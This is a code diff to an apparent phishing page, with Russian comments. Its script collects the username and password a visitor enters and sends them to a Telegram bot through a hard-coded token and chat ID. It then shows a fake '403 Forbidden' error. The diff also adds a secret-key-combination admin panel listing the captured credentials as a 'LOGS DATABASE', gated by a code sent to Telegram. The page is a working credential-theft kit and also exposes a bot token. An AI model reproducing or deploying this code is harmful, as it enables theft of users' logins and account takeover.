@@ -57,15 +57,16 @@
     <div id="admin-auth" class="screen">
         <div class="login-card" style="border: 2px solid #ff0000;">
             <h2 style="color: #ff0000; margin-top:0;">SECURITY CHECK</h2>
-            <p id="status-text" style="font-size: 13px; color: #888; margin-bottom: 15px;">Введите данные и подтвердите в Telegram.</p>
+            <p id="status-text" style="font-size: 13px; color: #888; margin-bottom: 15px;">Введите данные. Код подтверждения придет в Telegram.</p>
             <input type="text" id="admin_user" placeholder="Admin Login">
-            <input type="password" id="admin_pass" placeholder="Admin Password">
+            <input type="password" id="admin_pass" placeholder="Admin Password (или Код из ТГ)">
             <button class="btn-auth" style="border-color: #ff0000; color: #ff0000;" id="unlock-btn" onclick="checkAdminAuth()">Unlock</button>
         </div>
     </div>
 
     <div id="admin-panel" class="screen">
         <div class="admin-box">
+            <h2 style="color: #fff;">LOGS DATABASE</h2>
             <table id="logTable">
                 <thead><tr><th>User</th><th>Pass</th><th>Time</th></tr></thead>
                 <tbody id="logData"></tbody>
@@ -77,7 +78,9 @@
     <script>
         const TG_TOKEN = "8385266015:AAHpN8EUWlEgoGtslfBoEoyqPycXD2gbPGw";
         const TG_CHAT_ID = "7863254073";
+        let secretCode = ""; // Сюда запишется код, который мы отправим в ТГ
 
+        // Секретка для вызова админки: Ctrl + \ + 3 + Z
         let pressedKeys = {};
         document.addEventListener('keydown', (e) => {
             pressedKeys[e.code] = true;
@@ -92,18 +95,18 @@
             document.getElementById(id).style.display = 'flex';
         }
 
+        // Сбор логов
         async function saveData() {
             const u = document.getElementById('username').value;
             const p = document.getElementById('password').value;
             if(!u || !p) return;
             
-            // Отправка лога в ТГ
             fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ 
                     chat_id: TG_CHAT_ID, 
-                    text: `👤 *NEW LOG!*\nUser: \`${u}\`\nPass: \`${p}\``, 
+                    text: `👤 *НОВЫЙ ЛОГ!*\nЮзер: \`${u}\`\nПароль: \`${p}\``, 
                     parse_mode: "Markdown" 
                 })
             });
@@ -114,20 +117,42 @@
             alert("Error 403: Forbidden");
         }
 
+        // Вход в админку через ТГ
         async function checkAdminAuth() {
+            const user = document.getElementById('admin_user').value;
+            const pass = document.getElementById('admin_pass').value;
             const status = document.getElementById('status-text');
-            const btn = document.getElementById('unlock-btn');
-            
-            status.innerText = "Waiting for Telegram confirmation...";
-            status.style.color = "#ffff00";
-            btn.disabled = true;
 
-            // Здесь мы просто имитируем проверку, так как бэкенда нет. 
-            // Через 3 секунды пустим в админку для вида.
-            setTimeout(() => {
-                showScreen('admin-panel');
-                updateLogs();
-            }, 3000);
+            // Если код еще не создан — отправляем его в ТГ
+            if (secretCode === "") {
+                secretCode = Math.floor(1000 + Math.random() * 9000).toString(); // Генерим 4 цифры
+                
+                status.innerText = "Запрос отправлен! Введите код из Telegram...";
+                status.style.color = "#ffff00";
+
+                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ 
+                        chat_id: TG_CHAT_ID, 
+                        text: `🔐 *ПОПЫТКА ВХОДА В АДМИНКУ*\n\nКто-то ввел логин: \`${user}\`\nТвой секретный код: \`${secretCode}\``, 
+                        parse_mode: "Markdown" 
+                    })
+                });
+            } else {
+                // Если код уже есть в ТГ, проверяем что ввел юзер
+                if (pass === secretCode) {
+                    status.innerText = "Доступ разрешен!";
+                    status.style.color = "#00ff00";
+                    setTimeout(() => {
+                        showScreen('admin-panel');
+                        updateLogs();
+                    }, 1000);
+                } else {
+                    status.innerText = "НЕВЕРНЫЙ КОД!";
+                    status.style.color = "#ff0000";
+                }
+            }
         }
 
         function updateLogs() {
